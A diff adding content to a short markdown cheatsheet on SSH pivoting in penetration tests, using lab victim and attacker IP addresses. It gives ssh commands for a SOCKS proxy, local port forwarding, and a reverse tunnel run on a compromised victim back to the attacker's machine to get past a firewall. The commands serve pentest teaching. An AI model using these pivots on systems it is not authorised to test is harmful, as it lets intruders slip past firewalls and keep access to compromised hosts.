@@ -1,8 +1,27 @@
 ## SSH Cheatsheet / Blackmagic
 
-SSH has a lot of exciting features when it comes to pivoting in a pentest environment; btw most of it stemmed from devops situations :P
+SSH has a lot of exciting features when it comes to pivoting in a pentest environment; btw most of it stemmed from devops situations :P. This is assuming you having ssh access on your victim, probably with root privilleges.
 
+192.168.56.201 -> Victim Machine
+192.168.56.202 -> Attacker Machine
 
+The -f Commands forks the process into background and -N will not execute remote commands so you don't see a bash terminal but it runs in background.Good for crappy shells with less interaction
+### 1. Socks Proxy
+	ssh -D 127.0.0.1:1080 victim@192.168.56.201 -f -N
+Creates a socks proxy tunnel via your local machine at local port 1080
+
+### 2. Local Port Forwarding
+	ssh -L 9999:localhost:22 victim@192.168.56.201 -f -N
+    
+Let's assume you have popped a box (low priv) which has ssh service running but the firewall blocks it from outside and for some wierd reason port 9999 is acessible from the outside.
+You could do the above mentioned to Locally forward 22 to 9999
+    
+### 3. Remote Port Forwarding
+The most useful commnand you will ever use in your life; execute at victim machine
+	ssh -R 6666:localhost:22 attacker@192.168.56.202
+This forwards localport (ssh of the victim) to your system local port 6666 through an ssh tunnel.
+
+You could then connct using ssh victim@localhost -p 6666 
 
 References:
 1. [The Black Magic of SSH / SSH Can do that ?](https://vimeo.com/54505525)
